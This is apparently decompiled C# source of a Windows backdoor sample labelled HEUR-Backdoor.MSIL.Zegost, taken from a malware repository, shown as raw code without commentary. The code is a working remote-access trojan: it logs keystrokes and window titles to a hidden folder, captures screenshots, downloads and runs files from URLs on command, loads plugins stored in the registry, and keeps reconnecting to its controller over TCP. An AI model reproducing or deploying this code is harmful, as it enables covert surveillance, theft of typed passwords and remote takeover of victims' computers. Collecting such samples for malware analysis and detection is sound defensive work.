// Decompiled with JetBrains decompiler
// Type: S400.Program
// Assembly: Client, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2E238969-7352-439B-AF4B-F16FB5D78EB5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Backdoor.MSIL.Zegost.gen-c50b14be52addaac071e25ca25c9249cd97eef4556b93db74f6aba00b8202b8a.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace S400
{
  public class Program
  {
    public static byte[] b = new byte[5121];
    public static TcpClient C = (TcpClient) null;
    public static bool Cn = false;
    public static Computer F = new Computer();
    public static FileStream FS;
    public static string Xml = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
    public static bool Adm = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
    public static string lastcap = "";
    public static FileInfo LO = new FileInfo(Assembly.GetEntryAssembly().Location);
    public static MemoryStream MeM = new MemoryStream();
    public static object MT = (object) null;
    public static object PLG = (object) null;
    public static string TCCP = "";
    public static int Last1 = 0;
    public static string Last2 = (string) null;
    public static Keys last3 = Keys.None;
    public static string hh = "";
    public static string pp = "";
    public static string Kn;
    private static Clock Clock = new Clock();
    private static string txt = "";
    private static object keyboard = (object) new Keyboard();

    [STAThread]
    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void Main()
    {
      if (System.IO.File.Exists(Program.Xml + "\\FD.ini"))
        System.IO.File.Delete(Program.Xml + "\\FD.ini");
      if (Interaction.Command() != null)
      {
        try
        {
          Program.F.Registry.CurrentUser.SetValue("di", (object) "!");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
        Thread.Sleep(5000);
      }
      bool createdNew = false;
      Program.MT = (object) new Mutex(true, Functions.rn, out createdNew);
      if (!createdNew)
        ProjectData.EndApp();
      Installing.INS();
      new Thread(new ThreadStart(Program.RC), 1).Start();
      new Thread(new ThreadStart(Program.XOP), 1).Start();
      int num = 0;
      string Left = "";
      while (true)
      {
        Thread.Sleep(1000);
        if (!Program.Cn)
          Left = "";
        Application.DoEvents();
        try
        {
          checked { ++num; }
          if (num == 5)
          {
            try
            {
              Process.GetCurrentProcess().MinWorkingSet = (IntPtr) 1024;
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
            }
          }
          if (num >= 8)
          {
            num = 0;
            string Right = Functions.ACT();
            if (Operators.CompareString(Left, Right, false) != 0)
            {
              Left = Right;
              Functions.Send("act1" + Functions.Y + Right);
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
    }

    public static void D_(object a0) => Program.I0((byte[]) a0);

    public static void I0(byte[] b)
    {
      string[] strArray1 = Strings.Split(Functions.BS(ref b), Functions.Y);
      try
      {
        string Left1 = strArray1[0];
        string Left2 = Left1;
        if (Operators.CompareString(Left2, "ll", false) == 0)
          Program.Cn = false;
        else if (Operators.CompareString(Left2, "DDel", false) == 0)
        {
          try
          {
            Program.txt = "";
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left2, "Del", false) == 0)
        {
          FileInfo[] files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\Logas\\").GetFiles();
          int index = 0;
          while (index < files.Length)
          {
            System.IO.File.Delete(files[index].FullName);
            checked { ++index; }
          }
        }
        else if (Operators.CompareString(Left2, "Get", false) == 0)
        {
          Program.Kn = (string) null;
          string str = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\Logas";
          if (!Directory.Exists(str))
            return;
          try
          {
            foreach (string file in MyProject.Computer.FileSystem.GetFiles(str, Microsoft.VisualBasic.FileIO.SearchOption.SearchAllSubDirectories))
              Program.Kn = Program.Kn + Path.GetFileName(file).Split('.')[0] + ":";
          }
          finally
          {
            IEnumerator<string> enumerator;
            enumerator?.Dispose();
          }
          Functions.Send("kl" + Functions.Y + Functions.ENB(ref Program.txt) + Functions.Y + Functions.ENB(ref Program.Kn) + Functions.Y + (string) null);
        }
        else if (Operators.CompareString(Left2, "Read", false) == 0)
        {
          string str1 = System.IO.File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\Logas\\" + strArray1[1] + ".txt");
          string[] strArray2 = new string[7]
          {
            "kl",
            Functions.Y,
            Functions.ENB(ref Program.txt),
            Functions.Y,
            null,
            null,
            null
          };
          string[] strArray3 = strArray2;
          string s = "..";
          string str2 = Functions.ENB(ref s);
          strArray3[4] = str2;
          strArray2[5] = Functions.Y;
          strArray2[6] = str1;
          Functions.Send(string.Concat(strArray2));
        }
        else if (Operators.CompareString(Left2, "kl", false) == 0)
        {
          string[] strArray4 = new string[7]
          {
            "kl",
            Functions.Y,
            Functions.ENB(ref Program.txt),
            Functions.Y,
            null,
            null,
            null
          };
          string[] strArray5 = strArray4;
          string s = "..";
          string str = Functions.ENB(ref s);
          strArray5[4] = str;
          strArray4[5] = Functions.Y;
          strArray4[6] = (string) null;
          Functions.Send(string.Concat(strArray4));
        }
        else if (Operators.CompareString(Left1, "rn", false) == 0)
        {
          byte[] bytes;
          if (strArray1[2][0] == '\u001F')
          {
            try
            {
              MemoryStream memoryStream = new MemoryStream();
              int length = (strArray1[0] + Functions.Y + strArray1[1] + Functions.Y).Length;
              memoryStream.Write(b, length, checked (b.Length - length));
              bytes = Functions.ZIP(memoryStream.ToArray());
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
              return;
            }
          }
          else
          {
            WebClient webClient = new WebClient();
            try
            {
              bytes = webClient.DownloadData(strArray1[2]);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
              return;
            }
          }
          Functions.Send("bla");
          string str = Path.GetTempFileName() + "." + strArray1[1];
          try
          {
            System.IO.File.WriteAllBytes(str, bytes);
            Process.Start(str);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
        }
        else
        {
          string Left3 = Left1;
          if (Operators.CompareString(Left3, "inv", false) == 0)
          {
            byte[] numArray = (byte[]) Functions.Gc(strArray1[1], (object) new byte[0]);
            if (strArray1[3].Length < 10 & numArray.Length == 0)
            {
              Functions.Send("pl" + Functions.Y + strArray1[1] + Functions.Y + Conversions.ToString(1));
            }
            else
            {
              if (strArray1[3].Length > 10)
              {
                MemoryStream memoryStream = new MemoryStream();
                int length = (strArray1[0] + Functions.Y + strArray1[1] + Functions.Y + strArray1[2] + Functions.Y).Length;
                memoryStream.Write(b, length, checked (b.Length - length));
                numArray = Functions.ZIP(memoryStream.ToArray());
                Functions.TV(strArray1[1], (object) numArray, RegistryValueKind.Binary);
              }
              Functions.Send("pl" + Functions.Y + strArray1[1] + Functions.Y + Conversions.ToString(0));
              object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Functions.Plugin(numArray, "A"))));
              NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "h", new object[1]
              {
                (object) Program.hh
              }, (string[]) null, (System.Type[]) null);
              NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "p", new object[1]
              {
                (object) Program.pp
              }, (string[]) null, (System.Type[]) null);
              NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "osk", new object[1]
              {
                (object) strArray1[2]
              }, (string[]) null, (System.Type[]) null);
              NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "start", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
              while (!Conversions.ToBoolean(RuntimeHelpers.GetObjectValue(Operators.OrObject((object) !Program.Cn, RuntimeHelpers.GetObjectValue(Operators.CompareObjectEqual(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "Off", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)), (object) true, false))))))
                Thread.Sleep(1);
              NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "off", new object[1]
              {
                (object) true
              }, (string[]) null, (System.Type[]) null);
            }
          }
          else if (Operators.CompareString(Left3, "ret", false) == 0)
          {
            byte[] numArray = (byte[]) Functions.Gc(strArray1[1], (object) new byte[0]);
            if (strArray1[2].Length < 10 & numArray.Length == 0)
            {
              Functions.Send("pl" + Functions.Y + strArray1[1] + Functions.Y + Conversions.ToString(1));
            }
            else
            {
              if (strArray1[2].Length > 10)
              {
                MemoryStream memoryStream = new MemoryStream();
                int length = (strArray1[0] + Functions.Y + strArray1[1] + Functions.Y).Length;
                memoryStream.Write(b, length, checked (b.Length - length));
                numArray = Functions.ZIP(memoryStream.ToArray());
                Functions.TV(strArray1[1], (object) numArray, RegistryValueKind.Binary);
              }
              Functions.Send("pl" + Functions.Y + strArray1[1] + Functions.Y + Conversions.ToString(0));
              object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Functions.Plugin(numArray, "A"))));
              string[] strArray6 = new string[5]
              {
                "ret",
                Functions.Y,
                strArray1[1],
                Functions.Y,
                null
              };
              string[] strArray7 = strArray6;
              string s = Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "GT", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)));
              string str = Functions.ENB(ref s);
              strArray7[4] = str;
              Functions.Send(string.Concat(strArray6));
            }
          }
          else if (Operators.CompareString(Left3, "CAP", false) == 0)
          {
            Rectangle targetRect = Screen.PrimaryScreen.Bounds;
            Bitmap bitmap1 = new Bitmap(Screen.PrimaryScreen.Bounds.Width, targetRect.Height, PixelFormat.Format16bppRgb555);
            Graphics g = Graphics.FromImage((Image) bitmap1);
            Size size = new Size(bitmap1.Width, bitmap1.Height);
            g.CopyFromScreen(0, 0, 0, 0, size, CopyPixelOperation.SourceCopy);
            try
            {
              size = new Size(32, 32);
              targetRect = new Rectangle(Cursor.Position, size);
              Cursors.Default.Draw(g, targetRect);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
            }
            g.Dispose();
            Bitmap bitmap2 = new Bitmap(Conversions.ToInteger(strArray1[1]), Conversions.ToInteger(strArray1[2]));
            Graphics graphics = Graphics.FromImage((Image) bitmap2);
            graphics.DrawImage((Image) bitmap1, 0, 0, bitmap2.Width, bitmap2.Height);
            graphics.Dispose();
            MemoryStream memoryStream1 = new MemoryStream();
            string S = "CAP" + Functions.Y;
            b = Functions.SB(ref S);
            memoryStream1.Write(b, 0, b.Length);
            MemoryStream memoryStream2 = new MemoryStream();
            bitmap2.Save((Stream) memoryStream2, ImageFormat.Jpeg);
            string Left4 = Functions.md5(memoryStream2.ToArray());
            if (Operators.CompareString(Left4, Program.lastcap, false) != 0)
            {
              Program.lastcap = Left4;
              memoryStream1.Write(memoryStream2.ToArray(), 0, checked ((int) memoryStream2.Length));
            }
            else
              memoryStream1.WriteByte((byte) 0);
            Functions.Sendb(memoryStream1.ToArray());
            memoryStream1.Dispose();
            memoryStream2.Dispose();
            bitmap1.Dispose();
            bitmap2.Dispose();
          }
          else if (Operators.CompareString(Left1, "Ex", false) == 0)
          {
            if (Program.PLG == null)
            {
              Functions.Send("PLG");
              int num = 0;
              while (!(Program.PLG != null | num == 20 | !Program.Cn))
              {
                checked { ++num; }
                Thread.Sleep(1000);
              }
              if (Program.PLG == null | !Program.Cn)
                return;
            }
            object[] Arguments = new object[1]{ (object) b };
            bool[] CopyBack = new bool[1]{ true };
            NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(Program.PLG), (System.Type) null, "ind", Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
            if (!CopyBack[0])
              return;
            b = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Arguments[0]))), typeof (byte[]));
          }
          else
          {
            if (Operators.CompareString(Left1, "PLG", false) != 0)
              return;
            MemoryStream memoryStream = new MemoryStream();
            int length = (strArray1[0] + Functions.Y).Length;
            memoryStream.Write(b, length, checked (b.Length - length));
            Program.PLG = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Functions.Plugin(Functions.ZIP(memoryStream.ToArray()), "A"))));
            NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(Program.PLG), (System.Type) null, "H", new object[1]
            {
              (object) Program.hh
            }, (string[]) null, (System.Type[]) null);
            NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(Program.PLG), (System.Type) null, "P", new object[1]
            {
              (object) Program.pp
            }, (string[]) null, (System.Type[]) null);
            NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(Program.PLG), (System.Type) null, "c", new object[1]
            {
              (object) Program.C
            }, (string[]) null, (System.Type[]) null);
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        if (strArray1.Length > 0 && Operators.CompareString(strArray1[0], "Ex", false) == 0 | Operators.CompareString(strArray1[0], "PLG", false) == 0)
          Program.PLG = (object) null;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }

    [DllImport("user32.dll")]
    private static extern int ToUnicodeEx(
      uint wVirtKey,
      uint wScanCode,
      byte[] lpKeyState,
      [MarshalAs(UnmanagedType.LPWStr), Out] StringBuilder pwszBuff,
      int cchBuff,
      uint wFlags,
      IntPtr dwhkl);

    [DllImport("user32.dll")]
    private static extern bool GetKeyboardState(byte[] lpKeyState);

    [DllImport("user32.dll")]
    private static extern uint MapVirtualKey(uint uCode, uint uMapType);

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetKeyboardLayout(int dwLayout);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern short GetAsyncKeyState(int vKey);

    private static string Active()
    {
      try
      {
        object foregroundWindow = (object) Program.GetForegroundWindow();
        object obj = foregroundWindow;
        IntPtr num;
        int lpdwProcessID;
        Program.GetWindowThreadProcessId(obj != null ? (IntPtr) obj : num, ref lpdwProcessID);
        object processById = (object) Process.GetProcessById(lpdwProcessID);
        if (!Conversions.ToBoolean(Operators.OrObject(Operators.AndObject(Operators.CompareObjectEqual(NewLateBinding.LateGet(foregroundWindow, (System.Type) null, "ToInt32", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) Program.Last1, false), Operators.CompareObjectEqual((object) Program.Last2, NewLateBinding.LateGet(processById, (System.Type) null, "MainWindowTitle", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(processById, (System.Type) null, "MainWindowTitle", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "Length", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) 0, false))))
        {
          Program.Last1 = Conversions.ToInteger(NewLateBinding.LateGet(foregroundWindow, (System.Type) null, "ToInt32", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
          Program.Last2 = Conversions.ToString(NewLateBinding.LateGet(processById, (System.Type) null, "MainWindowTitle", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
          return Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("\r\n\u0001" + Program.Datae() + " "), NewLateBinding.LateGet(processById, (System.Type) null, "ProcessName", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)), (object) " "), (object) Program.Last2), (object) '\u0001'), (object) "\r\n"));
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return "";
    }

    private static string Datae()
    {
      string str;
      try
      {
        str = Program.Clock.LocalTime.ToString("yy/MM/dd");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "??/??/??";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    private static string UTF(uint VKCode)
    {
      try
      {
        StringBuilder pwszBuff = new StringBuilder();
        byte[] lpKeyState = new byte[(int) byte.MaxValue];
        if (!Program.GetKeyboardState(lpKeyState))
          return "";
        uint wScanCode = Program.MapVirtualKey(VKCode, 0U);
        IntPtr foregroundWindow = Program.GetForegroundWindow();
        int lpdwProcessID = 0;
        IntPtr keyboardLayout = (IntPtr) Program.GetKeyboardLayout(Program.GetWindowThreadProcessId(foregroundWindow, ref lpdwProcessID));
        Program.ToUnicodeEx(VKCode, wScanCode, lpKeyState, pwszBuff, 5, 0U, keyboardLayout);
        return pwszBuff.ToString();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return ((Keys) checked ((int) VKCode)).ToString();
    }

    private static string Fix(Keys k)
    {
      bool flag = Conversions.ToBoolean(NewLateBinding.LateGet(Program.keyboard, (System.Type) null, "ShiftKeyDown", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
      if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(Program.keyboard, (System.Type) null, "CapsLock", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) true, false))
        flag = !flag;
      string str;
      try
      {
        Keys keys = k;
        str = keys == Keys.F1 || keys == Keys.F2 || keys == Keys.F3 || keys == Keys.F4 || keys == Keys.F5 || keys == Keys.F6 || keys == Keys.F7 || keys == Keys.F8 || keys == Keys.F9 || keys == Keys.F10 || keys == Keys.F11 || keys == Keys.F12 || keys == Keys.End || keys == Keys.Delete || keys == Keys.Back ? "[" + k.ToString() + "]" : (keys == Keys.LShiftKey || keys == Keys.RShiftKey || keys == Keys.Shift || keys == Keys.ShiftKey || keys == Keys.Control || keys == Keys.ControlKey || keys == Keys.RControlKey || keys == Keys.LControlKey || keys == Keys.Alt ? "" : (keys != Keys.Space ? (keys == Keys.Return || keys == Keys.Return ? (!Program.txt.EndsWith("[ENTER]\r\n") ? "[ENTER]\r\n" : "") : (keys != Keys.Tab ? (!flag ? Program.UTF(checked ((uint) k)) : Program.UTF(checked ((uint) k)).ToUpper()) : "[TAP]\r\n")) : " "));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        if (flag)
        {
          str = Strings.ChrW((int) k).ToString().ToUpper();
          ProjectData.ClearProjectError();
        }
        else
        {
          str = Strings.ChrW((int) k).ToString().ToLower();
          ProjectData.ClearProjectError();
        }
      }
      return str;
    }

    private static void XOP()
    {
      try
      {
        int num = 0;
        while (true)
        {
          checked { ++num; }
          int vKey = 0;
          do
          {
            if (Program.GetAsyncKeyState(vKey) == (short) -32767)
            {
              Keys k = (Keys) vKey;
              object obj = (object) Program.Fix(k);
              if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj, (System.Type) null, "Length", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) 0, false))
              {
                Program.txt += Program.Active();
                Program.txt = Conversions.ToString(Operators.ConcatenateObject((object) Program.txt, obj));
              }
              Program.last3 = k;
            }
            checked { ++vKey; }
          }
          while (vKey <= (int) byte.MaxValue);
          if (num == 1000)
          {
            num = 0;
            int count = 20480;
            if (Program.txt.Length > count)
            {
              try
              {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\Logas";
                if (!Directory.Exists(path))
                  Directory.CreateDirectory(path);
                string str = "History [ " + Strings.Format((object) DateTime.Today).Replace("/", "_") + " ]";
                System.IO.File.WriteAllText(path + "\\" + str + ".txt", Functions.ENB(ref Program.txt));
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
                ProjectData.ClearProjectError();
              }
              Program.txt = Program.txt.Remove(0, count);
            }
          }
          Thread.Sleep(1);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowText(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

    [DllImport("user32.dll", EntryPoint = "GetWindowTextLengthA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowTextLength(long hwnd);

    public static void RC()
    {
      while (true)
      {
        Program.lastcap = "";
        if (Program.C != null)
        {
          long num1 = -1;
          int num2 = 0;
          try
          {
            while (true)
            {
              do
              {
                checked { ++num2; }
                if (num2 == 10)
                {
                  num2 = 0;
                  Thread.Sleep(1);
                }
                if (Program.Cn)
                {
                  if (Program.C.Available < 1)
                    Program.C.Client.Poll(-1, SelectMode.SelectRead);
                  do
                  {
                    if (Program.C.Available > 0)
                    {
                      if (num1 == -1L)
                      {
                        string str = "";
                        while (true)
                        {
                          int CharCode = Program.C.GetStream().ReadByte();
                          switch (CharCode)
                          {
                            case -1:
                              goto label_20;
                            case 0:
                              goto label_11;
                            default:
                              str += Conversions.ToString(Conversions.ToInteger(Strings.ChrW(CharCode).ToString()));
                              continue;
                          }
                        }
label_11:
                        num1 = Conversions.ToLong(str);
                        if (num1 == 0L)
                        {
                          Functions.Send("");
                          num1 = -1L;
                        }
                      }
                      else
                        goto label_15;
                    }
                    else
                      goto label_20;
                  }
                  while (Program.C.Available > 0);
                  continue;
label_15:
                  Program.b = new byte[checked (Program.C.Available + 1 - 1 + 1)];
                  long num3 = checked (num1 - Program.MeM.Length);
                  if ((long) Program.b.Length > num3)
                    Program.b = new byte[checked ((int) (num3 - 1L) + 1 - 1 + 1)];
                  int count = Program.C.Client.Receive(Program.b, 0, Program.b.Length, SocketFlags.None);
                  Program.MeM.Write(Program.b, 0, count);
                }
                else
                  goto label_20;
              }
              while (Program.MeM.Length != num1);
              num1 = -1L;
              Thread thread = new Thread(new ParameterizedThreadStart(Program.D_), 1);
              thread.Start((object) Program.MeM.ToArray());
              thread.Join(100);
              Program.MeM.Dispose();
              Program.MeM = new MemoryStream();
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
        }
label_20:
        do
        {
          try
          {
            if (Program.PLG != null)
            {
              NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(Program.PLG), (System.Type) null, "clear", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
              Program.PLG = (object) null;
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
          Program.Cn = false;
        }
        while (!Functions.ct());
        Program.Cn = true;
      }
    }
  }
}
